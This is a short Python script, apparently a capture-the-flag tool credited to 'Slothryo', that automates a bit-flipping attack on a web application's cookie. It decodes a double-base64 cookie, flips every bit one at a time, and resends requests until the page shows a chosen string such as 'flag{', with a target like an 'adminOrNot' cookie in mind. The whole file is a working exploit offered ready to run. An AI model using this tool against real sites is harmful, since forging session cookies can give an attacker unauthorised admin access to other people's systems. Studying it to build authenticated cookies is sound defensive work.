from base64 import b64decode, b64encode
import sys
import requests
from tqdm import tqdm
from colorama import Fore


def flip(data: bytes, position: bytes, bit: bytes):
    return (
        data[:position] +
        (data[position] ^ (1 << bit)).to_bytes(1, "big") +
        data[position + 1:]
    )


def main():

    if len(sys.argv) < 4 or len(sys.argv) > 4:
        print(Fore.LIGHTBLACK_EX + "Usage:")
        print(Fore.RESET + " python main.py uri cookie_name strings")
        print("")
        print(Fore.LIGHTBLACK_EX + "Example:")
        print(Fore.RESET +
              " python main.py http://expamle.com/ adminOrNot flag{")
        print("")
        print(Fore.LIGHTBLACK_EX + "Developer")
        print(Fore.RESET + " Slothryo")
        return

    URI = sys.argv[1]
    COOKIE_NAME = sys.argv[2]
    STRINGS = sys.argv[3]

    print("[-] ----------------------------")
    print("[-] URI: " + URI)
    print("[-] COOKIE NAME: " + COOKIE_NAME)
    print("[-] STRINGS: " + STRINGS)
    print("[-] ----------------------------")

    request = requests.Session()
    try:
        request.get(URI)
    except:
        print("[x] URI is not found.")
        return
    try:
        cookie = request.cookies[COOKIE_NAME]
    except:
        print("[x] Cookie name is not found.")
        return
    decoded_cookie = b64decode(cookie)
    raw = b64decode(decoded_cookie)

    with tqdm(total=100, ascii=' #') as pbar:
        for position in range(0, len(raw)):
            for bit in range(0, 8):
                flipped = flip(raw, position, bit)
                encoded_flipped = b64encode(b64encode(flipped)).decode()
                determine_response = requests.get(
                    URI, cookies={COOKIE_NAME: encoded_flipped})

                if STRINGS in determine_response.text:
                    print(determine_response.text)
                    return
            pbar.update(100/len(raw))
        print("The String is not found.")
        return


if __name__ == "__main__":
    try:
        main()
    except:
        print("[x] Finished by what I've not expected")
